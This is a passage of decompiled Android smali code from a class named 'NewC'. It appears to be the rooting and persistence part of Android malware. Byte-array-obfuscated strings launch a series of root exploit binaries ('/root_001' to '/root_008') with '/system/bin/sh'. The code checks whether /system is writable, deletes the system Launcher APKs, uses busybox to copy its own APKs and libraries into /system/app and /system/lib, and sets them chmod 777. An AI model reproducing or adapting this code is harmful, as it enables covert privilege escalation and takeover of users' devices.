    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->e()Z

    move-result v2

    if-eqz v2, :cond_1ff

    const/4 v1, 0x6

    invoke-direct {p0, v1}, Lcom/test/NewC;->a(I)V

    goto/16 :goto_37

    :cond_1ff
    move v0, v1

    goto/16 :goto_37

    :array_202
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x66t
        0x30t
        0x68t
        0x35t
        0x7at
        0x67t
        0x75t
        0x5at
        0x39t
        0x61t
        0x4at
        0x58t
        0x62t
        0x43t
        0x5at
        0x45t
        0x78t
        0x4dt
        0x61t
        0x4et
        0x32t
        0x6bt
        0x44t
        0x68t
        0x68t
        0x36t
        0x56t
        0x30t
        0x55t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_224
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x61t
        0x6ct
        0x31t
        0x73t
        0x37t
        0x6at
        0x42t
        0x46t
        0x4et
        0x74t
        0x6et
        0x39t
        0x66t
        0x61t
        0x42t
        0x6dt
        0x43t
        0x30t
        0x4at
        0x62t
        0x39t
        0x41t
        0x39t
        0x4et
        0x73t
        0x6ct
        0x47t
        0x5at
        0x53t
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_246
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x37t
        0x20t
        0x48t
        0x79t
        0x67t
        0x5at
        0x52t
        0x6dt
        0x32t
        0x49t
        0x48t
        0x54t
        0x4bt
        0x57t
        0x70t
        0x70t
        0x37t
        0x48t
        0x6ct
        0x6ct
        0x2ft
        0x73t
        0x53t
        0x30t
        0x75t
        0x59t
        0x36t
        0x36t
        0x78t
        0x64t
        0x63t
        0x77t
        0x3dt
        0x3dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_268
    .array-data 1
        0x2ft
        0x2et
        0x72t
        0x6ft
        0x6ft
        0x74t
    .end array-data

    nop

    :array_270
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x32t
    .end array-data

    nop

    :array_27a
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x38t
    .end array-data

    nop

    :array_284
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x31t
        0x20t
        -0x1et
        -0x80t
        -0x6dt
        0x61t
        0x75t
        0x74t
        0x6ft
    .end array-data

    nop

    :array_292
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x34t
        0x20t
        0x50t
        0x46t
        0x4dt
        0x4dt
        0x65t
        0x68t
        0x78t
        0x76t
        0x4dt
        0x46t
        0x6bt
        0x32t
        0x56t
        0x53t
        0x46t
        0x4et
        0x38t
        0x41t
        0x77t
        0x38t
        0x58t
        0x47t
        0x58t
        0x68t
        0x39t
        0x31t
        0x55t
        0x4et
        0x69t
        0x45t
        0x53t
        0x72t
        0x2ft
        0x69t
        0x50t
        0x6et
        0x32t
        0x6dt
        0x48t
        0x5at
        0x4ft
        0x67t
        0x3dt
        0x3dt
        0x20t
        0x33t
        0x75t
        0x35t
        0x79t
        0x64t
        0x65t
        0x5at
        0x6bt
        0x75t
        0x49t
        0x4et
        0x37t
        0x42t
        0x31t
        0x4dt
        0x49t
        0x69t
        0x30t
        0x73t
        0x6at
        0x6bt
        0x77t
        0x75t
        0x66t
        0x55t
        0x6at
        0x62t
        0x6dt
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    nop

    :array_2c8
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x35t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data

    :array_2d8
    .array-data 1
        0x2ft
        0x72t
        0x6ft
        0x6ft
        0x74t
        0x5ft
        0x30t
        0x30t
        0x36t
        0x20t
        0x2ft
        0x73t
        0x79t
        0x73t
        0x74t
        0x65t
        0x6dt
        0x2ft
        0x62t
        0x69t
        0x6et
        0x2ft
        0x73t
        0x68t
    .end array-data
.end method

.method private e()Z
    .registers 2

    const-string v0, "[^0-9a-zA-Z]+rw[^0-9a-zA-Z]+"

    invoke-direct {p0, v0}, Lcom/test/NewC;->b(Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method private f()Z
    .registers 2

    const-string v0, "[^0-9a-zA-Z]+ro[^0-9a-zA-Z]+"

    invoke-direct {p0, v0}, Lcom/test/NewC;->b(Ljava/lang/String;)Z

    move-result v0

    return v0
.end method

.method private g()Z
    .registers 9

    const/4 v7, 0x0

    const/4 v6, 0x1

    const/4 v5, 0x0

    new-instance v0, Ljava/lang/StringBuilder;

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    const-string v2, "MMdd"

    invoke-static {v1, v2}, La/a/e/c;->a(Ljava/util/Date;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x6

    invoke-static {v1, v6}, La/a/e/f;->a(II)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    sget-object v0, Lcom/test/NewC;->e:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :cond_2a
    :goto_2a
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-nez v0, :cond_16f

    iget-boolean v0, p0, Lcom/test/NewC;->r:Z

    if-eqz v0, :cond_1bd

    iget-boolean v0, p0, Lcom/test/NewC;->s:Z

    if-nez v0, :cond_a2

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "a.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/busybox cp "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " /system/app/Launcher"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "a.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "chmod 777 /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "a.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    :cond_a2
    iget-boolean v0, p0, Lcom/test/NewC;->t:Z

    if-nez v0, :cond_110

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "b.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/busybox cp "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " /system/app/Launcher"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "b.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "chmod 777 /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "b.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    :cond_110
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "c.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/busybox cp "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/root_0000 /system/app/Launcher"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "c.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "chmod 777 /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "c.apk"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    :goto_16e
    return v6

    :cond_16f
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, La/a/e/f;->b(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2a

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "/busybox cp "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, " /system/lib/"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "chmod 777 /system/lib/"

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    goto/16 :goto_2a

    :cond_1bd
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "rm /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "a.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v7}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "/busybox cp "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    iget-object v2, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "/"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " /system/app/Launcher"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "a.apk"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "chmod 777 /system/app/Launcher"

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "a.apk"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v5, v6}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    goto/16 :goto_16e
.end method

.method private h()Z
    .registers 9

    const/16 v7, 0x18

    const/16 v6, 0x9

    const/16 v5, 0x39

    const/4 v0, 0x1

    const/4 v1, 0x0

    new-instance v2, Ljava/util/LinkedList;

    invoke-direct {v2}, Ljava/util/LinkedList;-><init>()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v5, [B

    fill-array-data v4, :array_1cc

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-eqz v3, :cond_36

    :cond_35
    :goto_35
    return v0

    :cond_36
    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v5, [B

    fill-array-data v4, :array_1ee

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v5, [B

    fill-array-data v4, :array_210

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    const-string v3, "export PATH=/system/bin/"

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v4, 0x6

    new-array v4, v4, [B

    fill-array-data v4, :array_232

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    const-string v3, "su"

    invoke-interface {v2, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v6, [B

    fill-array-data v4, :array_23a

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-array v4, v6, [B

    fill-array-data v4, :array_244

    invoke-static {v4}, Lcom/test/NewC;->a([B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v3, v2, v1}, Lcom/test/NewB;->a(Ljava/lang/String;Ljava/util/List;Z)La/a/c/a;

    invoke-direct {p0}, Lcom/test/NewC;->f()Z

    move-result v3

    if-nez v3, :cond_35

    invoke-interface {v2}, Ljava/util/List;->clear()V

    invoke-direct {p0, v2}, Lcom/test/NewC;->c(Ljava/util/List;)V

    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/test/NewC;->n:Ljava/lang/String;

